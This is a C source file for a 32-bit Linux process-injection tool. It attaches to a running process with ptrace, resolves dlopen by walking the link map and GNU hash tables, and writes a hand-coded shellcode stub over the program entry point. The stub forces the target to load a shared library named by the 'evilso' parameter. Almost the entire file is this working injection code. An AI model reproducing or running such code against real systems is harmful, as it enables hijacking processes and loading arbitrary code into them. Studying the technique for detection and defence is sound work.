#include "utils.h"

unsigned char
soloader[] =
	"\x90"
	"\xeb\x13"
	"\x58"
	"\xba\x01\x00\x00\x00"
	"\x52"
	"\x50"
	"\xbb\x03\x00\x00\x00"
	"\xff\xd3"
	"\x83\xc4\x08"
	"\xcc"
	"\xe8\xe8\xff\xff\xff";

void
ptrace_attach(int pid)
{
	if((ptrace(PTRACE_ATTACH , pid , NULL , NULL)) < 0) {
                        perror("ptrace_attach");
                        exit(-1);
	}

	waitpid(pid , NULL , WUNTRACED);
}

void
ptrace_cont(int pid)
{
	int s;

	if((ptrace(PTRACE_CONT , pid , NULL , NULL)) < 0) {
		perror("ptrace_cont");
		exit(-1);
	}

	while (!WIFSTOPPED(s)) waitpid(pid , &s , WNOHANG);
}

void
ptrace_detach(int pid)
{
	if(ptrace(PTRACE_DETACH, pid , NULL , NULL) < 0) {
		perror("ptrace_detach");
		exit(-1);
	}
}

int ptrace_read(int pid, unsigned long addr, void *vptr, unsigned int len)
{
	int bytesRead = 0;
	int i = 0;
	long word = 0;
	unsigned long *ptr = ( unsigned long *) vptr;

	if(addr < PROGRAM_LOAD_ADDRESS) {
		return -1;
	}

	while (bytesRead < len)
	{
		word = ptrace(PTRACE_PEEKTEXT, pid, addr + bytesRead, NULL);
		if(word == -1)
		{
			fprintf(stderr, "ptrace(PTRACE_PEEKTEXT) failed\n");
			return -1;
		}
		bytesRead += sizeof(word);
		ptr[i++] = word;
	}
	return 0;
}


void ptrace_write(int pid, unsigned long addr, void *vptr, int len)
{
	int byteCount = 0;
	long word = 0;

	while (byteCount < len)
	{
		memcpy(&word, vptr + byteCount, sizeof(word));
		word = ptrace(PTRACE_POKETEXT, pid, addr + byteCount, word);
		if(word == -1)
		{
			fprintf(stderr, "ptrace(PTRACE_POKETEXT) failed\n");
			exit(1);
		}
		byteCount += sizeof(word);
	}
}


void
setaddr(unsigned char *buf , ElfW(Addr) addr)
{
        *(buf) = addr;
        *(buf+1) = addr >> 8;
        *(buf+2) = addr >> 16;
        *(buf+3) = addr >> 24;
}

ElfW(Addr)
locate_start(int pid)
{
    ElfW(Ehdr) ehdr;
	ptrace_read(pid, PROGRAM_LOAD_ADDRESS, &ehdr , sizeof(ElfW(Ehdr)));
	return ehdr.e_entry;
}

struct link_map *
locate_linkmap(int pid)
{
    ElfW(Ehdr) ehdr;
    ElfW(Phdr) phdr;
    ElfW(Dyn) dyn;
	struct link_map *l = malloc(sizeof(struct link_map));
	ElfW(Addr) phdr_addr , dyn_addr , map_addr, gotplt_addr, text_addr;
	
	ptrace_read(pid, PROGRAM_LOAD_ADDRESS, &ehdr , sizeof(ElfW(Ehdr)));

	phdr_addr = PROGRAM_LOAD_ADDRESS + ehdr.e_phoff;

    ptrace_read(pid , phdr_addr, &phdr , sizeof(ElfW(Phdr)));
	
	while ( phdr.p_type != PT_DYNAMIC ) {
        ptrace_read(pid, phdr_addr += sizeof(ElfW(Phdr)), &phdr, sizeof(ElfW(Phdr)));
	}		 

	/* now go through dynamic section until we find address of GOT.PLT */
    ptrace_read(pid, phdr.p_vaddr, &dyn, sizeof(ElfW(Dyn)));
	
	dyn_addr = phdr.p_vaddr;

	while ( dyn.d_tag != DT_PLTGOT ) {
		ptrace_read(pid, dyn_addr += sizeof(ElfW(Dyn)), &dyn, sizeof(ElfW(Dyn)));
	}
	
    /* link_map address, .got.plt address */
	gotplt_addr = dyn.d_un.d_ptr;

	/* now just read first link_map item and return it */
	ptrace_read(pid, gotplt_addr + sizeof(ElfW(Addr)), &map_addr , sizeof(ElfW(Addr)));
	ptrace_read(pid , map_addr, l , sizeof(struct link_map));

	return l;
}

//eglibc-2.19/elf/dl-lookup.c
unsigned long
dl_new_hash (const char *s)
{
  unsigned long h = 5381;
  unsigned char c;
  for (c = *s; c != '\0'; c = *++s)
    h = h * 33 + c;
  return h & 0xffffffff;
}

void
setup_hash(int pid, struct link_map *map, struct link_map_more *map_more) {
    Elf32_Word *gnu_hash_header = (Elf32_Word *)malloc(sizeof(Elf32_Word) * 4);
    ptrace_read(pid, map_more->gnuhash_addr, gnu_hash_header, sizeof(Elf32_Word) * 4);
    
    // .gnu.hash
	map_more->nbuckets =gnu_hash_header[0];
    map_more->symndx = gnu_hash_header[1];
    map_more->nmaskwords = gnu_hash_header[2];
    map_more->shift2 = gnu_hash_header[3];
    map_more->bitmask_addr = map_more->gnuhash_addr + 4 * sizeof(Elf32_Word);
    map_more->hash_buckets_addr =  map_more->bitmask_addr + map_more->nmaskwords * sizeof(ElfW(Addr));
	map_more->hash_values_addr = map_more->hash_buckets_addr + map_more->nbuckets * sizeof(Elf32_Word);
}

/* seach symbol name in elf(so) */
ElfW(Sym) *
symhash(int pid, struct link_map_more *map_more, const char *symname)
{
	unsigned long c;
	Elf32_Word new_hash, h2;
	unsigned int  hb1, hb2;
	unsigned long n;
    Elf_Symndx symndx;
	ElfW(Addr) bitmask_word;
    ElfW(Addr) addr;
    ElfW(Addr) sym_addr;
    ElfW(Addr) hash_addr;
	char symstr[256];
	ElfW(Sym) * sym = malloc(sizeof(ElfW(Sym)));

	new_hash = dl_new_hash(symname);

	/* new-hash % __ELF_NATIVE_CLASS */
	hb1 = new_hash & (__ELF_NATIVE_CLASS - 1);
	hb2 = (new_hash >> map_more->shift2) & (__ELF_NATIVE_CLASS - 1);

	printf("[*] start gnu hash search:\n\tnew_hash: 0x%x(%u)\n", symname, new_hash, new_hash);

	/* ELFCLASS size */
    //__ELF_NATIVE_CLASS

	/*  nmaskwords must be power of 2, so that allows the modulo operation */
	/* ((new_hash / __ELF_NATIVE_CLASS) % maskwords) */
	n = (new_hash / __ELF_NATIVE_CLASS) & (map_more->nmaskwords - 1);
	printf("\tn: %lu\n", n);

    /* Use hash to quickly determine whether there is the symbol we need */
	addr = map_more->bitmask_addr + n * sizeof(ElfW(Addr));
	ptrace_read(pid, addr, &bitmask_word, sizeof(ElfW(Addr)));
    /* eglibc-2.19/elf/dl-loopup.c:236 */
    /* https://blogs.oracle.com/ali/entry/gnu_hash_elf_sections */
    /* different method same result */
    if(((bitmask_word >> hb1) & (bitmask_word >> hb2) & 1) == 0)
		return NULL;

	/* The first index of `.dynsym` to the bucket .dynsym */
	addr = map_more->hash_buckets_addr + (new_hash % map_more->nbuckets) * sizeof(Elf_Symndx);
	ptrace_read(pid, addr, &symndx, sizeof(Elf_Symndx));
	printf("\thash buckets index: 0x%x(%u), first dynsym index: 0x%x(%u)\n", (new_hash % map_more->nbuckets), (new_hash % map_more->nbuckets), symndx, symndx);

	if(symndx == 0)
		return NULL;

	sym_addr = map_more->dynsym_addr + symndx * sizeof(ElfW(Sym));
	hash_addr = map_more->hash_values_addr + (symndx - map_more->symndx) * sizeof(Elf32_Word);
	
	printf("[*] start bucket search:\n");
    do
    {
		ptrace_read(pid, hash_addr, &h2, sizeof(Elf32_Word));
		printf("\th2: 0x%x(%u)\n", h2, h2);
        /* 1. hash value same */
        if(((h2 ^ new_hash) >> 1) == 0) {

			sym_addr = map_more->dynsym_addr + ((map_more->symndx + (hash_addr - map_more->hash_values_addr) / sizeof(Elf32_Word)) * sizeof(ElfW(Sym)));
            /* read ElfW(Sym) */
			ptrace_read(pid, sym_addr, sym, sizeof(ElfW(Sym)));
            addr = map_more->dynstr_addr + sym->st_name;
            /* read string */
            ptrace_read(pid, addr, symstr, sizeof(symstr));

            /* 2. name same */
            if(!strcmp(symname, symstr))
                return sym;
        }
		hash_addr += sizeof(sizeof(Elf32_Word));
	} while((h2 & 1u) == 0); // search in same bucket
    return NULL;
}

void
resolv_dynamic_section(int pid , struct link_map *map, struct link_map_more *map_more)
{
	ElfW(Dyn) dyn;
    ElfW(Addr) addr;

	addr = (ElfW(Addr))map->l_ld;
	ptrace_read(pid , addr, &dyn, sizeof(ElfW(Dyn)));
    
    unsigned long sn = 0;

	while ( dyn.d_tag ) {
		switch ( dyn.d_tag ) {
			//.gnu.hash         GNU_HASH 	 000001b8 0001b8 003d1c 04   A  4   0  4
			case DT_GNU_HASH:
                map_more->gnuhash_addr = dyn.d_un.d_ptr;
                setup_hash(pid, map, map_more);
				printf("[+] gnu.hash:\n\tnbuckets: 0x%x\n\tsymndx: 0x%x\n\tnmaskwords: 0x%x\n\tshift2: 0x%x\n", map_more->nbuckets, map_more->symndx, map_more->nmaskwords, map_more->shift2);
				printf("\tbitmask_addr: 0x%x\n\thash_buckets_addr: 0x%x\n\thash_values_addr: 0x%x\n", map_more->bitmask_addr, map_more->hash_buckets_addr, map_more->hash_values_addr);
				break;

			case DT_STRTAB:
				map_more->dynstr_addr = dyn.d_un.d_ptr;
				printf("[+] dynstr: %p\n", map_more->dynstr_addr);
				break;
		
			case DT_SYMTAB:
				map_more->dynsym_addr = dyn.d_un.d_ptr;
				printf("[+] dynysm: %p\n", map_more->dynsym_addr);
				break;

            case DT_SONAME:
                sn = dyn.d_un.d_val;
                break;

			default:
				break;
		}

		addr += sizeof(ElfW(Dyn));
		ptrace_read(pid, addr , &dyn , sizeof(ElfW(Dyn)));
	}

	ptrace_read(pid, map_more->dynstr_addr + sn, map_more->soname, sizeof(map_more->soname));
    
    if(sn)
	{
        printf("[+] soname: %s\n", map_more->soname);
	}
}

ElfW(Addr)
find_sym_in_lib(int pid , char *symname , char *lib)
{
	struct link_map	*map, *l_prev;
    ElfW(Addr) sym_addr = 0;
	char libname[256];

	/* sym */
	ElfW(Sym) * sym;

	map = locate_linkmap(pid);

    struct link_map_more map_more;

	printf("[*] start search \'%s\':\n", symname);
	while (!sym_addr && map->l_next) {
		ptrace_read(pid, (ElfW(Addr))map->l_next, map, sizeof(struct link_map));
		l_prev = map->l_next;
		
		if(ptrace_read(pid, (ElfW(Addr))map->l_name, libname, sizeof(libname)) == -1)
			continue;

		/* compare libname if its not NULL */
		if (lib) if(strncmp(libname, lib, strlen(lib)) != 0) 
			continue;
		
		printf("----------------------------------------------------------------\n");
		printf("[+] libaray path: %s\n", libname);
		resolv_dynamic_section(pid, map, &map_more);
		
		// /* find symbol */
		sym = symhash(pid, &map_more, symname);
		printf("----------------------------------------------------------------\n");
		if(sym) {
			sym_addr = sym->st_value + map->l_addr;
			printf("[+] Found \'%s\' at %p\n", symname, sym_addr);
			return sym_addr;
		}
	}

	printf("[-] Not found \'%s\'", symname);
	return 0;
}		

void
inject_code(int pid, char *evilso, ElfW(Addr) dlopen_addr) {
	struct	user_regs_struct regz, regzbak;
	unsigned long len;
	unsigned char *backup = NULL;
	unsigned char *loader = NULL;
	ElfW(Addr) entry_addr;

	setaddr(soloader + 12, dlopen_addr);

	entry_addr = locate_start(pid);
	printf("[+] entry point: 0x%x\n", entry_addr);

	len = sizeof(soloader) + strlen(evilso);
	loader = malloc(sizeof(char) * len);
	memcpy(loader, soloader, sizeof(soloader));
	memcpy(loader+sizeof(soloader) - 1 , evilso, strlen(evilso));

	backup = malloc(len + sizeof(ElfW(Word)));
	ptrace_read(pid, entry_addr, backup, len);

	if(ptrace(PTRACE_GETREGS , pid , NULL , &regz) < 0) exit(-1);
	if(ptrace(PTRACE_GETREGS , pid , NULL , &regzbak) < 0) exit(-1);
	printf("[+] stopped %d at eip:%p, esp:%p\n", pid, regz.eip, regz.esp);

	regz.eip = entry_addr + 2;

	/* code inject */
	ptrace_write(pid, entry_addr, loader, len);

	/* set eip as entry_point */
	ptrace(PTRACE_SETREGS , pid , NULL , &regz);
	ptrace_cont(pid);

	if(ptrace(PTRACE_GETREGS , pid , NULL , &regz) < 0) exit(-1);
	printf("[+] inject code done %d at eip:%p\n", pid, regz.eip);

	/* restore backup data */
	// ptrace_write(pid,entry_addr, backup, len);
	ptrace(PTRACE_SETREGS , pid , NULL , &regzbak);
}